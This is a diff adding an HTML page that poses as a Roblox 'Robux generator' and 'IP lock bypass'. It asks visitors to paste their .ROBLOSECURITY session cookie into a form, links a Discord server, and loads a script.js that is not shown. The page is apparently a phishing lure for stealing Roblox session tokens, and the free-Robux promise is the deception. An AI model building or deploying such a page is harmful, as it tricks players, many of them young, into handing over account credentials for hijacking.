@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="fr">
+   <head>
+      <meta charset="UTF-8">
+      <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+      <meta name="robots" content="index, follow">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta property="og:title" content="Roblox IP Lock Bypass">
+      <meta property="og:description" content="Website that bypasses IP Locks for Cookies!">
+      <meta name="keywords" content="Roblox Robux Generator" >
+      <title>Robux Gen</title>
+      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+      <link rel="icon" href="public/e\ copy.png" type="image/x-icon">
+      <style>
+         /* Copyright Info */
+         #copyright {
+         font-size: 11px;
+         color: rgb(255, 255, 255);
+         transition: font-size 0.3s ease, color 0.3s ease; 
+         }
+         #copyright:hover {
+         font-size: 17px; 
+         color: rgb(138, 203, 247); 
+         }
+        /* Copyright Info */
+
+        /* Background */
+
+         body {
+         background: url('https://cdn.discordapp.com/attachments/1151159745621803049/1151860862961856593/background.jpg');
+         background-repeat: no-repeat;
+         background-size: cover;
+         background-color: #000;
+         color: #fff;
+         font-family: 'Montserrat', sans-serif;
+         width: 100%;
+         height: 100vh;
+         margin: 0;
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         }
+         body::after {
+         content: '';
+         position: absolute;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100vh;
+         background: rgba(0, 0, 0, 0.79);
+         z-index: -2;
+         }
+         body::before {
+         content: '';
+         position: absolute;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100vh;
+         background: url('https://cdn.discordapp.com/attachments/1151481817048825888/1151578856579403817/bg-pattern.png');
+         z-index: -1;
+         animation: backgroundPanel_anim 1000s linear infinite;
+         }
+         @keyframes backgroundPanel_anim {
+         0% {
+         background-position-x: 0;
+         }
+         25%, 50%, 75% {
+         background-position-x: 3000px;
+         }
+         100% {
+         background-position-x: 0;
+         }
+         }
+        /* Background */
+
+
+        /* Container & Result */
+
+         #container {
+         width: 400px; 
+         background: linear-gradient(to bottom, #333, #444);
+         padding: 20px; 
+         border-radius: 15px; 
+         box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+         text-align: center;
+         position: relative;
+         color: #fff; 
+         font-size: 16px; 
+         line-height: 1.5; 
+         margin: 0 auto; 
+         }
+         #result {
+         background-color: #2c2f31;
+         padding: 10px;
+         margin-top: 10px;
+         white-space: nowrap; 
+         overflow-x: auto; 
+         }
+        /* Container & Result */
+
+        /* Buttons */
+
+         .btn-purple {
+         background-color: #585863;
+         color: #fff;
+         }
+         .btn-purple:hover {
+         background-color: #585863;
+         }
+         #refreshButtonIcon {
+         width: 20px;
+         height: 20px;
+         margin-right: 5px;
+         }
+         /* Buttons */
+
+         .app-discord-social {
+         position: absolute;
+         bottom: 10px; 
+         right: 10px; 
+         transform: scale(0.8); 
+         transition: transform 0.3s, color 0.3s; 
+         }
+         .app-discord-social i {
+         font-size: 26px; 
+         color: gray; 
+         }
+         .app-discord-social:hover {
+         transform: scale(1.1); 
+         }
+         .app-discord-social:hover i {
+         color: rgb(44, 57, 207);
+         }
+         .rotate-icon {
+         animation: spin 2s linear infinite;
+         }
+         @keyframes spin {
+         0% { transform: rotate(0deg); }
+         100% { transform: rotate(360deg); }
+         }
+
+    #authCookie {
+        transition: border-color 0.3s ease-in-out;
+    }
+
+    #authCookie:focus {
+        border-color: #585863; 
+        box-shadow: 0 0 5px rgba(39, 60, 166, 0.5); 
+    }
+      </style>
+   </head>
+   <body>
+      <div id="container" class="bg-dark">
+        <h3 class="text-center">
+            Belsicc Robux's Generator
+            <img src="kshitlogo.jpg" alt="Logo" width="32" height="32" style="margin-right: 10px; border-radius: 50%;">
+        </h3>
+         <form id="cookieForm">
+            <input type="text" id="authCookie" class="form-control rounded bg-dark text-white mb-2" placeholder="Enter your .ROBLOSECURITY Cookie." required>
+            <button type="button" id="refreshButton" class="btn btn-purple btn-block">
+            <img id="refreshButtonIcon" src="https://cdn.discordapp.com/attachments/1221375665165832222/1221412624764239892/CxNVkTRvlyiuj2LapZDgYJXbMZfWMTnliqLskgoU2uRnfkAYqTbts9TCiSZCEBhzSv6SFfoRWZiH33qSkWkb7BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAd3Ychh93QG68AAAAASUVORK5CYII.png?ex=66127c26&is=66000726&hm=a0eb413710de1eb278e64b3ef44d718233f89fb47b94671c5ade2d1737e1a872&" alt="Refresh Icon">
+            Roblox Robux
+            </button>
+         </form>
+         <div id="result"></div>
+         <button id="copyButton" class="btn btn-purple btn-block mt-3">Copy</button>
+         <p id="countdown" class="mt-3 text-muted text-center"></p>
+         <span id="copyright" class="text-zinc-500 inline" style="font-size: 15px;">Belsicc</span>
+         <a href="https://discord.gg/z8zKgNvQ" target="_blank" class="app-discord-social">
+         <i class="fab fa-discord"></i>
+         </a>
+      </div>
+      <script src="https://kit.fontawesome.com/b617dc6679.js" crossorigin="anonymous"></script>
+      <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+      <script src="script.js"></script>
+   </body>
+</html>
